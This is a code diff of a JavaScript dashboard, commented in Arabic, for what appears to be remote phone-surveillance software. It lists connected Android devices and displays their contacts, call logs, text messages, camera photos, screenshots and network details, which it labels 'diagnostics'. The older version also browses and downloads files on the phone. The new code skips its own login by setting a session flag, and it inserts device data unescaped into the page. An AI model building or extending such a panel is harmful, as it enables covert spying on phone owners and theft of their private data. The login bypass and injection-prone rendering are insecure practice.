@@ -1,164 +1,205 @@
-let currentDeviceId = '';
-let currentDirectory = '/storage/emulated/0/';
-let fileListPollingInterval = null;
+// تجاوز صفحة تسجيل الدخول والدخول للوحة مباشرة
+sessionStorage.setItem('logged_in', 'true');
 
-function switchTab(tabName) {
-    document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('active'));
-    document.querySelectorAll('.menu-btn').forEach(el => el.classList.remove('active'));
-    const targetTab = document.getElementById(tabName + 'Tab');
-    if (targetTab) targetTab.classList.add('active');
-    event.currentTarget.classList.add('active');
+let currentDevice = null;
+let updateInterval = null;
+let dataInterval = null;
+
+// تسجيل الخروج
+function logout() { 
+    sessionStorage.removeItem('logged_in'); 
+    window.location.reload(); 
 }
 
-// جلب الأجهزة المتصلة كل 5 ثوانٍ
-function fetchDevices() {
-    fetch('/api/devices')
-    .then(res => res.json())
-    .then(data => {
-        const select = document.getElementById('deviceSelect');
-        const statusDiv = document.getElementById('connectionStatus');
-        if (data.devices && data.devices.length > 0) {
-            select.innerHTML = '';
-            data.devices.forEach(dev => {
-                let opt = document.createElement('option');
-                opt.value = dev;
-                opt.textContent = dev;
-                select.appendChild(opt);
-            });
-            if (!currentDeviceId) {
-                currentDeviceId = data.devices[0];
-            }
-            statusDiv.style.color = '#00ffcc';
-            statusDiv.textContent = '● متصل بنجاح';
-            
-            // جلب بيانات الجهاز وعرضها
-            fetch(`/api/data/${currentDeviceId}`)
-                .then(res => res.json())
-                .then(data => {
-                    document.getElementById('contactsContent').innerHTML = data.contacts && data.contacts.length ? data.contacts.join('<br>') : 'لا توجد بيانات';
-                    document.getElementById('callsContent').innerHTML = data.calls && data.calls.length ? data.calls.join('<br>') : 'لا توجد بيانات';
-                    document.getElementById('messagesContent').innerHTML = data.messages && data.messages.length ? data.messages.join('<br>') : 'لا توجد بيانات';
-                }).catch(err => console.error("Error fetching data:", err));
-            
-            // تحميل المسار الافتراضي إذا لم يتم تحميله
-            if (!document.getElementById('fileListContainer').innerHTML.trim()) {
-                openPath(currentDirectory);
-            }
-        } else {
-            select.innerHTML = '<option value="">لا توجد أجهزة متصلة</option>';
-            statusDiv.style.color = '#e74c3c';
-            statusDiv.textContent = '● غير متصل (بانتظار التطبيق)';
-        }
-    }).catch(err => console.error("Error fetching devices:", err));
-}
-
-setInterval(fetchDevices, 5000);
-fetchDevices();
-
-function changeDevice() {
-    currentDeviceId = document.getElementById('deviceSelect').value;
-    openPath('/storage/emulated/0/');
-}
-
-// ** فتح مسار في مدير الملفات **
-function openPath(path) {
-    currentDirectory = path;
-    document.getElementById('currentPath').textContent = path;
-    document.getElementById('fileListContainer').innerHTML = '<div style="color: var(--muted);">جاري جلب الملفات... يرجى الانتظار...</div>';
-
-    // إرسال طلب تصفح الملفات إلى الخادم
-    fetch('/api/filemanager/list', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ deviceId: currentDeviceId, path: path })
-    })
-    .then(res => res.json())
-    .then(() => {
-        // بدء الاستعلام الدوري لنتيجة تصفح الملفات
-        if (fileListPollingInterval) clearInterval(fileListPollingInterval);
-        fileListPollingInterval = setInterval(() => {
-            fetch(`/api/filemanager/result/${currentDeviceId}`)
-            .then(res => res.json())
-            .then(data => {
-                if (data.files && data.files.length > 0) {
-                    clearInterval(fileListPollingInterval);
-                    displayFiles(data.files);
-                }
-            })
-            .catch(err => console.error("Error fetching file list result:", err));
-        }, 2000); // استعلام كل ثانيتين
-    })
-    .catch(err => {
-        console.error("Error:", err);
-        document.getElementById('fileListContainer').innerHTML = '<div style="color: var(--danger);">فشل الاتصال بالهاتف.</div>';
-    });
-}
-
-// ** عرض الملفات في الواجهة **
-function displayFiles(files) {
-    const container = document.getElementById('fileListContainer');
-    container.innerHTML = '';
-    
-    files.forEach(file => {
-        let item = document.createElement('div');
-        item.className = 'file-item';
+// تحميل الأجهزة المتصلة من السيرفر
+async function loadDevices() {
+    try {
+        const response = await fetch('/api/devices');
+        const data = await response.json();
+        const devices = data.devices || [];
         
-        if (file.isDirectory) {
-            item.innerHTML = `<div class="file-info"><span>📁 ${file.name}</span><span class="file-size">مجلد</span></div>`;
-            item.onclick = () => openPath(file.path);
-        } else {
-            let sizeFormatted = formatBytes(file.size || 0);
-            item.innerHTML = `
-                <div class="file-info">
-                    <span>📄 ${file.name}</span>
-                    <span class="file-size">${sizeFormatted}</span>
-                </div>
-                <button class="download-btn" onclick="downloadFile('${file.path}', event)">تحميل</button>
-            `;
+        const select = document.getElementById('deviceSelect');
+        const currentValue = currentDevice;
+        
+        select.innerHTML = '<option value="">اختر الجهاز...</option>';
+        
+        devices.forEach(device => {
+            const option = document.createElement('option');
+            option.value = device.id;
+            option.textContent = device.model || device.id;
+            select.appendChild(option);
+        });
+        
+        if (currentValue) { 
+            select.value = currentValue; 
+        } else if (devices.length > 0 && !currentDevice) { 
+            selectDevice(devices[0].id); 
+            select.value = devices[0].id; 
         }
-        container.appendChild(item);
-    });
-}
-
-function goBack() {
-    let parts = currentDirectory.split('/').filter(Boolean);
-    if (parts.length > 2) {
-        parts.pop();
-        let upperPath = '/' + parts.join('/') + '/';
-        openPath(upperPath);
-    } else {
-        openPath('/storage/emulated/0/');
+    } catch (e) {
+        console.error("Error loading devices:", e);
     }
 }
 
-// ** تحميل ملف (سيتم تطويره لاحقاً) **
-function downloadFile(filePath, event) {
-    event.stopPropagation();
-    alert("جاري تحضير ملف التحميل: " + filePath);
-    fetch('/api/filemanager/getfile', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ deviceId: currentDeviceId, path: filePath })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if(data.ok && data.data) {
-            let link = document.createElement('a');
-            link.href = data.data;
-            link.download = filePath.split('/').pop();
-            link.click();
-        } else {
-            alert("تم إرسال أمر جلب الملف بنجاح إلى الهاتف.");
-        }
-    })
-    .catch(err => alert("حدث خطأ أثناء تحميل الملف."));
+// اختيار جهاز محدد
+function selectDevice(deviceId) {
+    currentDevice = deviceId;
+    
+    if (updateInterval) clearInterval(updateInterval);
+    if (dataInterval) clearInterval(dataInterval);
+    
+    if (deviceId) {
+        updateInterval = setInterval(updateLiveData, 5000);
+        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 5000);
+        updateLiveData();
+        loadAllData();
+    }
 }
 
-function formatBytes(bytes, decimals = 2) {
-    if (bytes === 0 || bytes === '-') return '-';
-    const k = 1024;
-    const dm = decimals < 0 ? 0 : decimals;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+// تحديث حالة الاتصال
+async function updateLiveData() {
+    if (!currentDevice) return;
+    try {
+        const response = await fetch(`/api/diagnostics/${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        
+        const statusEl = document.getElementById('netType');
+        if (statusEl) {
+            if (data.diagnostics && data.diagnostics.ping) {
+                statusEl.textContent = 'متصل (Online) - آخر تحديث: ' + new Date(data.diagnostics.ping.updatedAt).toLocaleTimeString();
+                statusEl.style.color = 'var(--green)';
+            } else {
+                statusEl.textContent = 'بانتظار البيانات...';
+                statusEl.style.color = 'var(--yellow)';
+            }
+        }
+    } catch (e) {
+        const statusEl = document.getElementById('netType');
+        if (statusEl) {
+            statusEl.textContent = 'غير متصل';
+            statusEl.style.color = 'var(--red)';
+        }
+    }
 }
+
+// تحميل كل البيانات وعرضها
+async function loadAllData() {
+    if (!currentDevice) return;
+    try {
+        const response = await fetch(`/api/diagnostics/${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        const diag = data.diagnostics || {};
+
+        // 1. جهات الاتصال
+        if (diag.contacts && Array.isArray(diag.contacts.items)) {
+            const tbody = document.querySelector('#contactsTable tbody');
+            if (tbody) {
+                tbody.innerHTML = '';
+                diag.contacts.items.forEach(item => {
+                    const parts = item.split(':');
+                    const name = parts[0] || 'غير معروف';
+                    const phone = parts.slice(1).join(':').trim() || '';
+                    tbody.innerHTML += `<tr><td>${name}</td><td>${phone}</td></tr>`;
+                });
+                // عرض العدد الكلي
+                const header = document.querySelector('#contactsTab h3');
+                if (header) header.textContent = `جهات الاتصال المخزنة (${diag.contacts.count || diag.contacts.items.length})`;
+            }
+        }
+
+        // 2. سجل المكالمات
+        if (diag.calls && Array.isArray(diag.calls.items)) {
+            const tbody = document.querySelector('#callsTable tbody');
+            if (tbody) {
+                tbody.innerHTML = '';
+                diag.calls.items.forEach(item => {
+                    tbody.innerHTML += `<tr><td>سجل مكالمة</td><td>${item}</td></tr>`;
+                });
+                const header = document.querySelector('#callsTab h3');
+                if (header) header.textContent = `سجل المكالمات (${diag.calls.count || diag.calls.items.length})`;
+            }
+        }
+
+        // 3. الرسائل القصيرة
+        if (diag.messages && Array.isArray(diag.messages.items)) {
+            const tbody = document.querySelector('#messagesTable tbody');
+            if (tbody) {
+                tbody.innerHTML = '';
+                diag.messages.items.forEach(item => {
+                    tbody.innerHTML += `<tr><td>رسالة نصية</td><td>${item}</td></tr>`;
+                });
+                const header = document.querySelector('#messagesTab h3');
+                if (header) header.textContent = `الرسائل النصية (${diag.messages.count || diag.messages.items.length})`;
+            }
+        }
+
+        // 4. الوسائط (الصور ولقطات الشاشة)
+        if (diag.media && Array.isArray(diag.media.items)) {
+            const studioGallery = document.getElementById('studioGallery');
+            const screenshotsGallery = document.getElementById('screenshotsGallery');
+            
+            if (studioGallery) studioGallery.innerHTML = '';
+            if (screenshotsGallery) screenshotsGallery.innerHTML = '';
+
+            let cameraCount = 0;
+            let screenshotCount = 0;
+
+            diag.media.items.forEach(filePath => {
+                // عرض اسم الملف فقط (وليس المسار الكامل)
+                const fileName = filePath.split('/').pop();
+                
+                // زر التحميل
+                const downloadBtn = `<a href="${filePath}" download target="_blank" style="display:block; text-align:center; background:var(--green); color:#000; padding:4px 8px; border-radius:4px; text-decoration:none; font-size:11px; margin-top:5px;">⬇ تحميل</a>`;
+                
+                const card = `<div class="gallery-item">
+                    <div style="width:100%; height:110px; background:#111; display:flex; align-items:center; justify-content:center; color:var(--green); font-size:24px;">📷</div>
+                    <span style="font-size:10px; color:var(--muted); margin:4px 0; word-break:break-all; max-width:100%; text-align:center;">${fileName}</span>
+                    ${downloadBtn}
+                </div>`;
+                
+                if (filePath.includes('Screenshots')) {
+                    if (screenshotsGallery) screenshotsGallery.innerHTML += card;
+                    screenshotCount++;
+                } else {
+                    if (studioGallery) studioGallery.innerHTML += card;
+                    cameraCount++;
+                }
+            });
+
+            // عرض الأعداد
+            const studioHeader = document.querySelector('#studioTab h3');
+            if (studioHeader) studioHeader.textContent = `معرض الصور (DCIM / Camera) - ${cameraCount} صورة`;
+            
+            const screenshotHeader = document.querySelector('#screenshotsTab h3');
+            if (screenshotHeader) screenshotHeader.textContent = `لقطات الشاشة (Screenshots) - ${screenshotCount} صورة`;
+        }
+
+        // 5. معلومات الشبكة
+        if (diag.network && Array.isArray(diag.network.items)) {
+            const netType = document.getElementById('netType');
+            if (netType && diag.network.items.length > 0) {
+                netType.textContent = diag.network.items.join(' | ');
+                netType.style.color = 'var(--green)';
+            }
+        }
+
+    } catch (e) {
+        console.error("Error loading data:", e);
+    }
+}
+
+// تبديل التبويبات
+function switchTab(tabName) {
+    document.querySelectorAll('.menu-btn').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+    
+    const activeBtn = document.querySelector(`[onclick="switchTab('${tabName}')"]`);
+    if (activeBtn) activeBtn.classList.add('active');
+    
+    const pane = document.getElementById(`${tabName}Tab`);
+    if (pane) pane.classList.add('active');
+}
+
+// التهيئة
+loadDevices();
+setInterval(loadDevices, 10000);
